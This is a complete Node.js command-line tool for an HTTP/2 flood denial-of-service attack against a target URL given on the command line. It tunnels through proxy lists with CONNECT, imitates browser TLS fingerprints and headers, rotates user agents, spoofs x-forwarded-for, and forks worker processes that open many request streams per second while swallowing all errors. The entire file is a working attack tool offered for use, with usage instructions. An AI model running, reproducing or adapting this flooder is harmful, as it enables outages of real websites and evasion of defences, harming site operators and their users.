#!/usr/bin/env node
/* TLS HTTP/2 Flood with Proxy CONNECT */

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 6) {
    console.log(`Usage: node ${require('path').basename(__filename)} URL TIME RATE THREADS [proxyfile]`);
    console.log(`Example: node load.js https://example.com 500 8 1`);
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(3)].join(":");
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureContext = tls.createSecureContext({
    ciphers, sigalgs, honorCipherOrder: true, secureOptions,
    secureProtocol: "TLS_client_method"
});

const proxyFile = process.argv[6] || "proxy.txt";
let proxies = fs.readFileSync(proxyFile, "utf-8").trim().split(/[\r\n]+/).filter(Boolean);
let userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"];
try {
    if (fs.existsSync("ua.txt")) {
        userAgents = fs.readFileSync("ua.txt", "utf-8").trim().split(/[\r\n]+/).filter(Boolean);
    }
} catch(e) {}

const args = { target: process.argv[2], time: ~~process.argv[3], Rate: ~~process.argv[4], threads: ~~process.argv[5] };
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) cluster.fork();
} else {
    for (let i = 0; i < 10; i++) setInterval(runFlooder, 0);
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

const headers = {
    ":method": "GET",
    ":scheme": "https",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.5",
    "accept-encoding": "gzip, deflate, br",
    "cache-control": "no-cache",
    "upgrade-insecure-requests": "1",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
};

function connectProxy(proxyAddr, callback) {
    const [host, port] = proxyAddr.split(":");
    const payload = `CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\nConnection: Keep-Alive\r\n\r\n`;
    
    const connection = net.connect({ host, port: ~~port });
    connection.setTimeout(150000);
    connection.setKeepAlive(true, 60000);
    connection.setNoDelay(true);
    
    connection.on("connect", () => connection.write(payload));
    connection.on("data", chunk => {
        if (chunk.toString().includes("HTTP/1.1 200")) {
            callback(connection);
        } else {
            connection.destroy();
            callback(null);
        }
    });
    connection.on("timeout", () => { connection.destroy(); callback(null); });
    connection.on("error", () => { connection.destroy(); callback(null); });
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const [proxyHost, proxyPort] = proxyAddr.split(":");
    
    headers[":authority"] = parsedTarget.host;
    headers[":path"] = parsedTarget.path;
    headers["user-agent"] = randomElement(userAgents);
    headers["x-forwarded-for"] = proxyHost;
    
    connectProxy(proxyAddr, (connection) => {
        if (!connection) return;
        
        const tlsConn = tls.connect({
            port: 443, host: parsedTarget.host, servername: parsedTarget.host,
            rejectUnauthorized: false, socket: connection,
            ALPNProtocols: ["h2"], ciphers, sigalgs, ecdhCurve,
            secureContext, honorCipherOrder: false
        });
        tlsConn.setKeepAlive(true, 60000);
        tlsConn.setNoDelay(true);
        
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: { headerTableSize: 65536, maxConcurrentStreams: 1000, initialWindowSize: 1073741823, enablePush: false },
            createConnection: () => tlsConn
        });
        
        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const req = client.request(headers);
                    req.on("response", () => { req.close(); req.destroy(); });
                    req.end();
                }
            }, 1000);
        });
        
        client.on("close", () => { try { client.destroy(); connection.destroy(); } catch(e) {} });
        client.on("error", () => { try { client.destroy(); connection.destroy(); } catch(e) {} });
    });
}

setTimeout(() => process.exit(1), args.time * 1000);
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
